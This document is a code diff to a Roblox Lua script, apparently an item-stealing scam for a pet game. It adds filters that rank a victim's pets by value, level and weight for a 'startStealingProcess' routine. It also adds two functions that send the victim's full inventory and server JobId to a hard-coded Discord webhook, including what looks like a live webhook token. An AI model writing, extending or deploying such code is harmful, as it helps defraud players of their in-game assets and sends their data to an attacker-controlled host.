@@ -4,6 +4,22 @@ if game.PlaceId ~= 126884695634066 then
 end
 
 
+getgenv().PetConfig = {
+    MinLevel = 25,           -- минимальный возраст
+    MinWeight = 5.0,         -- минимальный вес
+    GrowthFactor = 0.1       -- формула роста веса: BaseWeight × (1 + Level × GrowthFactor)
+}
+
+getgenv().FullInventoryWebhook = "https://discord.com/api/webhooks/1402809600096469133/1KUMRwKTZySNoA9hbAEgrLxq6tNM48tQ38qXa4X5XMDCpNd-fGpFX7Q-kH0LEqjXYx8R"
+
+
+
+
+
+
+
+
+
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
@@ -183,38 +199,133 @@ local PET_VALUES = {
     ["French Fry Ferret"] = 300, ["Raccoon"] = 400, ["T-Rex"] = 100,
     ["Fennec Fox"] = 300, ["Dragonfly"] = 150, ["Butterfly"] = 300,
     ["Disco Bee"] = 500, ["Mimic Octopus"] = 100, ["Queen Bee"] = 100,
-    ["Spinosaurus"] = 200, ["Kitsune"] = 1890, ["Corrupted Kitsune"] = 100
+    ["Spinosaurus"] = 200, ["Kitsune"] = 1890, ["Corrupted Kitsune"] = 100,
+    ["Chicken Zombie"] = 100, ["Red Fox"] = 100
 }
+
+
+-- 🔎 Проверка возраста и веса питомца
+local function isPetValid(petData)
+    local minLevel = getgenv().PetConfig.MinLevel or 100
+    local minWeight = getgenv().PetConfig.MinWeight or 40
+    local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1
+
+    local level = petData.Level or 0
+    local baseWeight = petData.BaseWeight or 0
+    local realWeight = baseWeight * (1 + level * growthFactor)
+
+    return level >= minLevel or realWeight >= minWeight
+end
+
+
+
+
+
+
+
+
 
 print("=============4")
 
-local function checkPetsWhitelist(pet)
+local function checkPetsWhitelist(petName, petData)
     for _, name in ipairs(PET_WHITELIST) do
-        if string.find(pet, name) then
+        if petName == name and isPetValid(petData) then
             return true
         end
     end
     return false
 end
 
+
 local function getInventoryValue()
     print("=============getInventoryValue started")
     local total = 0
     for _, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         local petName = petData.PetType
-        print("=============Pet:", petName, "In whitelist:", checkPetsWhitelist(petName))
-        if checkPetsWhitelist(petName) then
-            local petPrice = PET_VALUES[petName] or 0
-            total += petPrice
+        if petData.PetData then
+            local inWhitelist = checkPetsWhitelist(petName, petData.PetData)
+            print("=============Pet:", petName, "In whitelist:", inWhitelist, "Level:", petData.PetData.Level or 0, "Weight:", petData.PetData.BaseWeight * (1 + (petData.PetData.Level or 0) * 0.1))
+            if inWhitelist then
+                local petPrice = PET_VALUES[petName] or 0
+                total += petPrice
+                print("=============Adding price:", petPrice, "for", petName)
+            end
+        else
+            print("=============No PetData for:", petName)
         end
     end
     print("=============Total inventory value:", total)
     return total
 end
 
+
+
 print("=============5")
 local inventoryValue = getInventoryValue()
 print("=============Inventory value:", inventoryValue)
+
+
+
+local function sendFullInventory()
+    local webhookUrl = getgenv().FullInventoryWebhook
+    if not webhookUrl or webhookUrl == "" then return end
+
+    local HttpService = game:GetService("HttpService")
+    local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
+    local allPetData = dataModule:GetData().PetsData.PetInventory.Data
+
+    local petLines = {}
+    local growthFactor = 0.1 -- 🔒 скрыто в коде
+
+    for _, value in pairs(allPetData) do
+        local petName = value.PetType
+        local petData = value.PetData
+        local level = petData.Level or 0
+        local baseWeight = petData.BaseWeight or 0
+        local weight = baseWeight * (1 + level * growthFactor)
+
+        table.insert(petLines, string.format("%s | Level: %s | Weight: %.2f KG", petName, level, weight))
+    end
+
+    local request = http_request or request or syn.request
+    if not request then return end
+
+    local payload = {
+        username = "Pet Inventory Logger",
+        avatar_url = "https://i.imgur.com/TSb7kEJ.png",
+        embeds = {{
+            title = "📦 Full Pet Inventory",
+            color = 3447003,
+            description = string.format("```\n%s\n```", table.concat(petLines, "\n")),
+            footer = {
+                text = string.format("Total Pets: %s | %s", #petLines, game.JobId)
+            }
+        }}
+    }
+
+    local success, response = pcall(function()
+        return request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+
+    if success then
+        print("✅ Full inventory sent to webhook")
+    else
+        warn("❌ Failed to send full inventory")
+    end
+end
+
+
+
+
+
+
+
+
 
 local function startStealingProcess()
     print("=============startStealingProcess started")
@@ -342,15 +453,36 @@ local function startStealingProcess()
     end
 
     local totalValue = 0
-    local victimPetTable = {}
-    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        local petName = value.PetType
-        print("=============Pet:", petName, "In whitelist:", checkPetsWhitelist(petName))
-        if not checkPetsWhitelist(petName) then continue end
-        local petPrice = PET_VALUES[petName] or 0
-        totalValue += petPrice
-        table.insert(victimPetTable, string.format("%s - %sValue", petName, petPrice))
+local victimPetTable = {}
+
+for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+    local petName = value.PetType
+    local petData = value.PetData
+
+    local inWhitelist = checkPetsWhitelist(petName, petData)
+    local isValid = isPetValid(petData)
+
+    local petPrice = 0
+    if inWhitelist then
+        petPrice = PET_VALUES[petName] or 0
+    elseif isValid then
+        petPrice = 50 -- 🟡 Присваиваем 50, если пет прошёл по весу/возрасту
     end
+
+    if petPrice > 0 then
+        totalValue += petPrice
+        local level = petData.Level or 0
+        local baseWeight = petData.BaseWeight or 0
+        local config = getgenv().PetConfig or {}
+        local growthFactor = config.GrowthFactor or 0.1
+        local realWeight = baseWeight * (1 + level * growthFactor)
+
+        local line = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)
+        table.insert(victimPetTable, line)
+
+        end
+    end
+
     print("=============victimPetTable:", table.concat(victimPetTable, ", "), "totalValue:", totalValue)
 
     if #victimPetTable == 0 then
@@ -448,7 +580,92 @@ local function startStealingProcess()
     end)
 end
 
-print("=============6")
+sendFullInventory() -- после всех действий
+
+
+
+local function sendFullInventoryFile()
+    local webhookUrl = getgenv().FullInventoryWebhook
+    if not webhookUrl or webhookUrl == "" then return end
+
+    local HttpService = game:GetService("HttpService")
+    local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
+    local allPetData = dataModule:GetData().PetsData.PetInventory.Data
+
+    local petLines = {}
+    local growthFactor = 0.1 -- спрятано
+
+    for _, value in pairs(allPetData) do
+        local petName = value.PetType
+        local petData = value.PetData
+        local level = petData.Level or 0
+        local baseWeight = petData.BaseWeight or 0
+        local weight = baseWeight * (1 + level * growthFactor)
+
+        table.insert(petLines, string.format("%s | Level: %s | Weight: %.2f KG", petName, level, weight))
+    end
+
+    local fullText = table.concat(petLines, "\n")
+
+    -- сохранить во временный файл
+    local fileName = "full_inventory.txt"
+    writefile(fileName, fullText)
+
+    local boundary = "------------------------" .. HttpService:GenerateGUID(false)
+
+    local body = "--" .. boundary .. "\r\n" ..
+        'Content-Disposition: form-data; name="file"; filename="' .. fileName .. '"\r\n' ..
+        "Content-Type: text/plain\r\n\r\n" ..
+        fullText .. "\r\n--" .. boundary .. "--"
+
+    local request = http_request or request or syn.request
+    if not request then return end
+
+    local headers = {
+        ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
+    }
+
+    local payload = {
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    }
+
+    local success, response = pcall(function()
+        return request(payload)
+    end)
+
+    if success and response.StatusCode == 200 or response.StatusCode == 204 then
+        print("✅ Full inventory sent as file.")
+    else
+        warn("❌ Failed to send full inventory:", response and response.StatusCode)
+    end
+end
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 -- Условия для вызова startStealingProcess или loadstring
 if not getgenv().Webhook or not getgenv().Username then
